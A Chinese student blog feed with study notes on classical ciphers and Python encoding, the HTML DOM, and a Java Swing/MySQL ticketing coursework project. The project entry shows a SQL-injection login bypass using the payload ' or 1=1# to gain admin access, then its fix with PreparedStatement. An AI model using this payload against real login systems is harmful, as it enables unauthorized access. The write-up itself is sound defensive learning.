<h3 id="替换和编码"><a href="#替换和编码" class="headerlink" title="替换和编码"></a>替换和编码</h3><p>古典加密还包括很多种形式的简单替换或编码，这些替换也常常出现杂项中，如摩尔斯电码、福尔摩斯跳舞的小人、敲击码、培根密码……</p>
<p>摩尔斯电码：用一个电键可以敲击出点、划以及中间的停顿。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209141751042.png" alt="image-20210209141751042"></p>
<p>福尔摩斯跳舞的小人：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209141800402.png" alt="image-20210209141800402"></p>
<p>敲击码：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209141810694.png" alt="image-20210209141810694"></p>
<p>培根密码：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209141926930.png" alt="image-20210209141926930"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209142100897.png" alt="image-20210209142100897"></p>
<p>使用 Python 脚本进制转换</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209142114307.png" alt="image-20210209142114307"></p>
<p>字符串(str)类型和字节(bytes)类型相互转换</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209142127954.png" alt="image-20210209142127954"></p>
<p>Base64编码解码</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209142135885.png" alt="image-20210209142135885"></p>
<p>整数和字节类型的转换</p>
<p>这种类型转换在密码方向题目中很常见，整数类型可以直接参与数学计算，字节类型会展示可读的字符</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210209142153434.png" alt="image-20210209142153434"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=5</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title>DOM学习笔记</title>
    <url>/2021/04/12/HTML-DOM/</url>
    <content><![CDATA[<h2 id="HTML-DOM简介"><a href="#HTML-DOM简介" class="headerlink" title="HTML DOM简介"></a>HTML DOM简介</h2><p>DOM (Document Object Model) 即为文档对象模型，是 HTML 和 XML 文档的编程接口。</p>
<p>HTML DOM 定义了访问和操作 HTML 文档的标准方法。</p>
<p>DOM 以树结构表达 HTML 文档。<a id="more"></a></p>
<p>当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。</p>
<p>HTML DOM 树形结构：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/pic_htmltree.gif" alt="DOM HTML tree"></p>
<p>通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。</p>
<p>JavaScript 能够改变页面中的所有 HTML 元素</p>
<p>JavaScript 能够改变页面中的所有 HTML 属性</p>
<p>JavaScript 能够改变页面中的所有 CSS 样式</p>
<p>JavaScript 能够对页面中的所有事件做出反应</p>
<h3 id="查找HTML元素"><a href="#查找HTML元素" class="headerlink" title="查找HTML元素"></a>查找HTML元素</h3><p>通过 JavaScript，您需要操作 HTML 元素</p>
<p>ID查找：document.getElementById(“id”)</p>
<p>标签名查找：document.getElementsByTagName(“tagname”)</p>
<p>类名查找：document.getElementsByClassName(“classname”)</p>
<p>用标签名或类名查找可能会找到很多个HTML DOM元素，它们会组成一个数组，DOM最上面的元素作为数组的第一个值。</p>
<p>比如：</p>
<p>document.getElementsByTagName(“p”)[0]  它会得到第一个p标签元素</p>
<h2 id="DOM-HTML"><a href="#DOM-HTML" class="headerlink" title="DOM HTML"></a>DOM HTML</h2><p>HTML DOM 允许 JavaScript 改变 HTML 元素的内容。</p>
<h3 id="改变HTML输出流"><a href="#改变HTML输出流" class="headerlink" title="改变HTML输出流"></a>改变HTML输出流</h3><p>document.write()直接向HTML输出流写内容</p>
<p>注意：不要在文档(DOM)加载完后使用document.write()，会覆盖文档。</p>
<h3 id="改变HTML内容"><a href="#改变HTML内容" class="headerlink" title="改变HTML内容"></a>改变HTML内容</h3><p>使用innerHTML属性</p>
<p>比如：document.getElementById(“demo”).innerHTML=hello world!</p>
<h3 id="改变HTML属性"><a href="#改变HTML属性" class="headerlink" title="改变HTML属性"></a>改变HTML属性</h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;id&quot;).attribute&#x3D;属性值</span><br></pre></td></tr></table></figure>

<p>比如：document.getElementsByTagName(“img”)[0].src=”xxx.jpg”</p>
<h2 id="DOM-CSS"><a href="#DOM-CSS" class="headerlink" title="DOM CSS"></a>DOM CSS</h2><p>HTML DOM 允许 JavaScript 改变 HTML 元素的样式。</p>
<h3 id="改变HTML样式"><a href="#改变HTML样式" class="headerlink" title="改变HTML样式"></a>改变HTML样式</h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;id&quot;).style.property&#x3D;样式值</span><br></pre></td></tr></table></figure>

<p>比如：document.getElementsByTagName(“p”)[0].style.color=”green”</p>
<h2 id="DOM事件"><a href="#DOM事件" class="headerlink" title="DOM事件"></a>DOM事件</h2><p>HTML DOM 使 JavaScript 有能力对 HTML 事件做出反应。</p>
<h3 id="对事件做出反应"><a href="#对事件做出反应" class="headerlink" title="对事件做出反应"></a>对事件做出反应</h3><p>我们可以在事件发生时执行 JavaScript，比如当用户在 HTML 元素上点击时。</p>
<p>点击某个元素时执行代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onclick&#x3D;JavaScript</span><br></pre></td></tr></table></figure>

<p>HTML 事件的例子：</p>
<p>用户点击鼠标时</p>
<p>网页完成加载时</p>
<p>图像完成加载时</p>
<p>鼠标移动到元素上时</p>
<p>输入字段被改变时</p>
<p>提交HTML表单时</p>
<p>用户触发按键</p>
<p>感觉最常用的应该是点击鼠标和触发按键吧，还没做过项目没实际开发过(如果有错当我没说=。=)</p>
<h3 id="HTML事件属性"><a href="#HTML事件属性" class="headerlink" title="HTML事件属性"></a>HTML事件属性</h3><p>如需向 HTML 元素分配 事件，您可以使用事件属性。</p>
<p>在button元素上加onclick事件属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;document.getElementById(&quot;demo&quot;).innerHTML&#x3D;&quot;xxx&quot;&gt;点击&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>其他事件属性还有</p>
<p>onload页面完成加载时</p>
<p>onload 事件可用于检测访问者的浏览器类型和浏览器版本，并基于这些信息来加载网页的正确版本。</p>
<p>onunloady页面退出时</p>
<p>onload 和 onunload 事件可用于处理 cookie。</p>
<p>onchange内容改变时 </p>
<p>onchange 事件常结合对输入字段的验证来使用。</p>
<p>onmouseover鼠标移至元素</p>
<p>onmouseout鼠标移出元素</p>
<p>onmousedown点击鼠标</p>
<p>onmouseup释放鼠标</p>
<p>onclick成鼠标点击</p>
<p>onmousedown, onmouseup 以及 onclick 构成了鼠标点击事件的所有部分。</p>
<h3 id="使用HTML-DOM来分配事件"><a href="#使用HTML-DOM来分配事件" class="headerlink" title="使用HTML DOM来分配事件"></a>使用HTML DOM来分配事件</h3><p>HTML DOM 允许您使用 JavaScript 来向 HTML 元素分配事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	document.getElementById(&quot;id&quot;).onclick&#x3D;JavaScript</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOM-EventListener"><a href="#DOM-EventListener" class="headerlink" title="DOM EventListener"></a>DOM EventListener</h2><h3 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener() 方法"></a>addEventListener() 方法</h3><p>addEventListener() 方法用于向指定元素添加事件句柄。</p>
<p>addEventListener() 方法添加的事件句柄不会覆盖已存在的事件句柄。</p>
<p>可以向一个元素添加多个事件句柄。</p>
<p>可以向同个元素添加多个同类型的事件句柄，如：两个 “click” 事件。</p>
<p>可以向任何 DOM 对象添加事件监听，不仅仅是 HTML 元素。如： window 对象。</p>
<p>可以使用 removeEventListener() 方法来移除事件的监听。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, displayDate);</span><br></pre></td></tr></table></figure>

<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure>

<p>第一个参数是事件的类型 (如 “click” 或 “mousedown”).</p>
<p>第二个参数是事件触发后调用的函数。</p>
<p>第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
<h3 id="向元素添加事件句柄"><a href="#向元素添加事件句柄" class="headerlink" title="向元素添加事件句柄"></a>向元素添加事件句柄</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.addEventListener(&quot;click&quot;, function()&#123; </span><br><span class="line">	alert(&quot;Hello World!&quot;); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以使用函数名，来引用外部函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.addEventListener(&quot;click&quot;, myFunction);</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    alert (&quot;Hello World!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="向同一元素添加多个事件句柄"><a href="#向同一元素添加多个事件句柄" class="headerlink" title="向同一元素添加多个事件句柄"></a>向同一元素添加多个事件句柄</h3><p>addEventListener() 方法允许向同一个元素添加多个事件，且不会覆盖已存在的事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.addEventListener(&quot;click&quot;, myFunction);</span><br><span class="line">element.addEventListener(&quot;click&quot;, mySecondFunction);</span><br></pre></td></tr></table></figure>

<p>同个元素添加不同类型的事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">element.addEventListener(&quot;mouseover&quot;, myFunction);</span><br><span class="line">element.addEventListener(&quot;click&quot;, mySecondFunction);</span><br><span class="line">element.addEventListener(&quot;mouseout&quot;, myThirdFunction);</span><br></pre></td></tr></table></figure>

<h3 id="向Window对象添加事件句柄"><a href="#向Window对象添加事件句柄" class="headerlink" title="向Window对象添加事件句柄"></a>向Window对象添加事件句柄</h3><p>addEventListener() 方法允许你在 HTML DOM 对象添加事件监听， HTML DOM 对象如： HTML 元素, HTML 文档, window 对象。或者其他支持的事件对象如: xmlHttpRequest 对象。</p>
<p>重置窗口大小时添加事件监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.addEventListener(&quot;resize&quot;, function()&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; sometext;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="事件冒泡或事件捕获"><a href="#事件冒泡或事件捕获" class="headerlink" title="事件冒泡或事件捕获"></a>事件冒泡或事件捕获</h3><p>事件传递有两种方式：冒泡与捕获。</p>
<p>事件传递定义了元素事件触发的顺序。 如果你将 <p> 元素插入到 <div> 元素中，用户点击 <p> 元素, 哪个元素的 “click” 事件先被触发呢？</p>
<p>在 <em>冒泡</em> 中，内部元素的事件会先被触发，然后再触发外部元素，即： <p> 元素的点击事件先触发，然后会触发 <div> 元素的点击事件。</p>
<p>在 <em>捕获</em> 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即： <div> 元素的点击事件先触发 ，然后再触发 <p> 元素的点击事件。</p>
<p>addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure>

<p>默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递。</p>
<h3 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener() 方法"></a>removeEventListener() 方法</h3><p>removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;myDIV&quot;).addEventListener(&quot;mousemove&quot;, myFunction);</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML &#x3D; Math.random();</span><br><span class="line">&#125;</span><br><span class="line">function removeHandler() &#123;</span><br><span class="line">    document.getElementById(&quot;myDIV&quot;).removeEventListener(&quot;mousemove&quot;, myFunction);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOM元素"><a href="#DOM元素" class="headerlink" title="DOM元素"></a>DOM元素</h2><h3 id="创建新的HTML元素-节点"><a href="#创建新的HTML元素-节点" class="headerlink" title="创建新的HTML元素(节点)"></a>创建新的HTML元素(节点)</h3><p>要创建新的 HTML 元素 (节点)需要先创建一个元素，然后在已存在的元素中添加它。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para &#x3D; document.createElement(&quot;p&quot;);</span><br><span class="line">var node &#x3D; document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">var element &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">element.appendChild(para);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>创建元素：document.createElement(“tagname”)</p>
<p>创建文本节点：document.createTextNode(“xxxxxx”)</p>
<h4 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild()"></a>appendChild()</h4><p>添加新元素到尾部：appendChild(子元素)</p>
<h4 id="insertBefore"><a href="#insertBefore" class="headerlink" title="insertBefore()"></a>insertBefore()</h4><p>添加新元素到开始位置：insertBefore(子元素，插入在哪个元素前面)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para &#x3D; document.createElement(&quot;p&quot;);</span><br><span class="line">var node &#x3D; document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">var element &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">element.insertBefore(para, child);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="移除已存在的元素"><a href="#移除已存在的元素" class="headerlink" title="移除已存在的元素"></a>移除已存在的元素</h3><p>要移除一个元素，你需要知道该元素的父元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var parent &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">parent.removeChild(child);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="替换HTML元素"><a href="#替换HTML元素" class="headerlink" title="替换HTML元素"></a>替换HTML元素</h3><p>可以使用 replaceChild() 方法来替换 HTML DOM 中的元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;div1&quot;&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p1&quot;&gt;这是一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;p2&quot;&gt;这是另外一个段落。&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line">var para &#x3D; document.createElement(&quot;p&quot;);</span><br><span class="line">var node &#x3D; document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"> </span><br><span class="line">var parent &#x3D; document.getElementById(&quot;div1&quot;);</span><br><span class="line">var child &#x3D; document.getElementById(&quot;p1&quot;);</span><br><span class="line">parent.replaceChild(para, child);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="HTML-Collection对象"><a href="#HTML-Collection对象" class="headerlink" title="HTML Collection对象"></a>HTML Collection对象</h2><p>getElementsByTagName()和getElementsByClassName()这两个方法查找多个DOM元素，返回HTMLCollection对象。</p>
<p>HTMLCollection 对象类似包含 HTML 元素的一个数组，它不是数组，但可以用索引来获取元素</p>
<p>比如：document.getElementByTagName(“p”)[0]</p>
<p>HTMLCollection 对象的 length 属性定义了集合中元素的数量。</p>
<p>比如：document.getElementByTagName(“p”).length</p>
<p>length属性常用于遍历数组来循环：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myCollection &#x3D; document.getElementsByTagName(&quot;p&quot;);</span><br><span class="line">var i;</span><br><span class="line">for (i &#x3D; 0; i &lt; myCollection.length; i++) &#123;</span><br><span class="line">    myCollection[i].style.backgroundColor &#x3D; &quot;red&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NodeList对象"><a href="#NodeList对象" class="headerlink" title="NodeList对象"></a>NodeList对象</h2><p>NodeList对象是一个从文档中获取的节点列表 (集合) 。</p>
<p>NodeList对象类似HTMLCollection对象。</p>
<p>所有浏览器的childNodes属性返回的是 NodeList 对象。</p>
<p>大部分浏览器的querySelectorAll()返回 NodeList 对象。</p>
<p>以下代码选取了文档中所有的 <p> 节点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myNodeList &#x3D; document.querySelectorAll(&quot;p&quot;);</span><br></pre></td></tr></table></figure>

<p>它也能用索引来访问元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y &#x3D; myNodeList[1];</span><br></pre></td></tr></table></figure>

<p>NodeList 对象 length 属性定义了节点列表中元素的数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myNodelist &#x3D; document.querySelectorAll(&quot;p&quot;);</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML &#x3D; myNodelist.length;</span><br></pre></td></tr></table></figure>

<h3 id="HTMLCollection-与-NodeList-的区别"><a href="#HTMLCollection-与-NodeList-的区别" class="headerlink" title="HTMLCollection 与 NodeList 的区别"></a>HTMLCollection 与 NodeList 的区别</h3><p>querySelectorAll()和getElementsByTagName()两者的主要区别就是返回值。前者返回的是NodeList集合，后者返回的是HTMLCollection集合。其前者是一个静态集合，后者是一个动态集合。</p>
<p>其中动态集合和静态集合的最大区别在于：动态集合指的就是元素集合会随着DOM树元素的增加而增加，减少而减少；静态集合则不会受DOM树元素变化的影响。</p>
<p>使用getElementsByTagName方法我们得到的结果就像是一个对象的索引，而通过querySelectorAll方法我们得到的是一个对象的克隆；所以当这个对象数据量非常大的时候，显然克隆这个对象所需要花费的时间是很长的。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.runoob.com/js/js-htmldom.html" target="_blank" rel="noopener">https://www.runoob.com/js/js-htmldom.html</a></p>
<p><a href="https://juejin.cn/post/6844903473155145736" target="_blank" rel="noopener">https://juejin.cn/post/6844903473155145736</a></p>
<p><a href="https://my.oschina.net/u/3996925/blog/2990342" target="_blank" rel="noopener">https://my.oschina.net/u/3996925/blog/2990342</a></p>
<p><a href="https://www.w3cplus.com/javascript/querySelectorAll-vs-getElementsByTagName.html" target="_blank" rel="noopener">https://www.w3cplus.com/javascript/querySelectorAll-vs-getElementsByTagName.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>JAVA实验课大作业笔记</title>
    <url>/2021/05/30/JAVA-GUI/</url>
    <content><![CDATA[<p>Java实验大作业是做一个GUI，我分配到的是高铁售票系统<a id="more"></a></p>
<h2 id="简单交互"><a href="#简单交互" class="headerlink" title="简单交互"></a>简单交互</h2><p>初期的时候以为只要做一个在控制台(Console)里交互显示的就可以了，做完找老师验收才知道要做GUI。</p>
<p>看了老师给的作品，看懂之后，照着它依葫芦画瓢，抄抄改改写写做完了交互的。</p>
<p>写之前，根据自己分配到的题目，列了个提纲规划一下自己要实现的功能以及要创建的数据表有哪些，如下：(字丑见谅Orz)</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529221703751.png" alt="image-20210529221703751"></p>
<p>大概过程就是创建三个对象分别为Paid(已购信息)、Passenger(乘客信息)、Railway(高铁信息)，每个对象里面都是简单的定义成员变量以及给每个成员变量写好设定方法(set)和获取方法(get)，然后写数据库查询(sql)的类，然后写对应不同功能的视图类(view)，最后就是创建一个主程序入口用户交互。项目结构如下：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529222511025.png" alt="image-20210529222511025"></p>
<p>util包和window包是后面GUI的时候写的</p>
<p>mysql表及结构：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530001312358.png" alt="image-20210530001312358"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530001349781.png" alt="image-20210530001349781"></p>
<h2 id="GUI图形化"><a href="#GUI图形化" class="headerlink" title="GUI图形化"></a>GUI图形化</h2><p>本来也想看看老师给的成品，然后自己抄抄改改写写就好了，但是好多GUI的东西都看不懂，索性就直接把第九章的自学了，把书上的每一个Example都敲了一遍，学完再回来写GUI就觉得简单多了</p>
<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>看书自学完第九章GUI，看书的时候除了学了GUI组件之外还学到了之前老师没讲到的内部类和Lambda表达式，看的时候有些地方不是很明白，但不影响我coding。然后看书上用的插件是JavaFX，照着书上教程安装结果报错了，网上搜了很久，发现关于这个插件的信息很少而且有的也是年代久远，没有找到解决办法，于是搜了下其他的GUI插件，就找到了WindowBuilder的教程(前两篇参考文章)，讲的很详细，安装完之后看了教程基本学会了怎么用。</p>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>跟之前一样，写之前先用笔写了个草稿，如下，就是规划好了菜单栏。(字太丑了~~)</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529232559640.png" alt="image-20210529232559640"></p>
<h3 id="主要过程"><a href="#主要过程" class="headerlink" title="主要过程"></a>主要过程</h3><p>登录界面直接复制的，懒得写了。把老师给的成品看了一下，登录进之后主要就是一个主界面(MainFrame)，然后菜单栏里的每个界面对应一个java文件，每个界面无非也就是初始化(initComponents)然后再加上一些响应事件。界面用插件设置好组件并且写完动作事件之后，在最后设置可见，然后在主界面里面的动作事件里<code>new classname()</code>就可以响应了</p>
<h3 id="学到的点"><a href="#学到的点" class="headerlink" title="学到的点"></a>学到的点</h3><p>1.每个界面用插件做好之后，在最后加上下面两句代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setLocationRelativeTo(getOwner());</span><br><span class="line">setVisible(true);</span><br></pre></td></tr></table></figure>

<p>第一个可加可不加，只是一个相对位置。第二个一定要加，不然点击就不会显示了</p>
<p>2.写的时候遇到了要把String类型转为int类型，网上搜了下可以用<code>Integer.parseInt()</code>函数实现</p>
<p>3.我看老师给的作品里有提示框，查询完之后根据查询返回的int结果来判断是否成功，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JOptionPane.showMessageDialog(null, &quot;添加成功&quot;);</span><br></pre></td></tr></table></figure>

<p>提示并退出</p>
<p>4.关闭窗体用<code>dispose()</code>可以实现，比如在退出按钮的动作里加上这个就可以实现退出了</p>
<h3 id="查询多结果处理"><a href="#查询多结果处理" class="headerlink" title="查询多结果处理"></a>查询多结果处理</h3><p>查询所有车次信息这种功能可能会出现多条数据，一开始不知道怎么办，因为他查出来的数据是动态的，有多少条我不知道不能提前做好多少个文本框，另外因为我没法运行老师的作品，不知道它是怎么写的。所以自己想了个办法，就是创建JScrollPane，里面再加一个JPanel，每一个查出的结果都创建为一个JTextField然后加到JPanel里，这样不就可以实现滚动了嘛，多了就可以有滚动条了，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btnNewButton.addActionListener(new ActionListener() &#123;</span><br><span class="line">			public void actionPerformed(ActionEvent e) &#123;</span><br><span class="line">				int n&#x3D;0,c&#x3D;0;</span><br><span class="line">				String inf;</span><br><span class="line">				List&lt;Railway&gt; list&#x3D;RailwayView.allRailwayView();</span><br><span class="line">				for(Railway r:list) &#123;					</span><br><span class="line">					n++;</span><br><span class="line">					JTextField textField &#x3D; new JTextField();</span><br><span class="line">					textField.setBounds(0, c, 412, 21);</span><br><span class="line">					panel.add(textField);</span><br><span class="line">					textField.setColumns(10);</span><br><span class="line">					inf&#x3D;&quot;日期:&quot;+r.getDate()+&quot; 时间:&quot;+r.getTime()+&quot; 商务座:&quot;+r.getSy()+&quot; 一等座:&quot;+r.getYy()+&quot; 二等座:&quot;+r.getEy()+&quot; 车号:&quot;+r.getCh();</span><br><span class="line">					textField.setText(inf);</span><br><span class="line">					c+&#x3D;20;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529235015172.png" alt="image-20210529235015172"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529235023201.png" alt="image-20210529235023201"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529235029134.png" alt="image-20210529235029134"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529235034975.png" alt="image-20210529235034975"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210529235042695.png" alt="image-20210529235042695"></p>
<p>具体的功能页面懒得截了</p>
<h2 id="登录功能存在SQL注入漏洞"><a href="#登录功能存在SQL注入漏洞" class="headerlink" title="登录功能存在SQL注入漏洞"></a>登录功能存在SQL注入漏洞</h2><p>因为我的登录功能的java是直接复制老师的，我看到它里面用的是statement来查询的，再加上它的查询语句是直接拼接且没有做任何过滤，导致了漏洞的存在。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530104806423.png" alt="image-20210530104806423"></p>
<p>这里我使用万能密码<code>&#39; or 1=1#</code>就能绕过登录验证了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530104953371.png" alt="image-20210530104953371"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530105008468.png" alt="image-20210530105008468"></p>
<p>成功进入并且是管理员身份，因为在user表中第一条数据就是admin用户，用万能密码登录后会返回所有数据，根据登录的逻辑<code>result.next()</code>取到的数据就是第一条admin用户，所以登录的身份是admin</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530105258266.png" alt="image-20210530105258266"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530105536845.png" alt="image-20210530105536845"></p>
<p>如果不是admin用户的话，菜单栏里的前两个菜单是被禁用的。</p>
<p>修复方法是使用prepareStatement预编译SQL语句，把查询函数用prepareStatement修改了下果然万能密码失效了，网上查了些文章，大概原理就是预编译的sql语句是带着占位符的，并且查询前已经被预编译一次了，之后不会再次编译，只会把接受到动态参数当成一个属性进行解析查询，这样即使接收到<code>&#39; or 1=1</code>这样的参数也只会把他当成属性值来处理而不会作为SQL指令，讲得不是很清楚，可查看(前两篇除外的)参考文章。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530110456054.png" alt="image-20210530110456054"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210530110841874.png" alt="image-20210530110841874"></p>
<p>但是使用prepareStatement就一定安全了吗，前几天刚好看到Ms08067安全实验室公众号里发的Java注入漏洞精选文章里看到一篇名为 “<a href="https://www.cnblogs.com/iyangyuan/p/4809494.html" target="_blank" rel="noopener">用java PreparedStatement就不用担心sql注入了吗？</a>“ 的文章，顿时吸引了我的注意力，因为我觉得预编译应该不能再注入了，看完之后又学到了新的思路。</p>
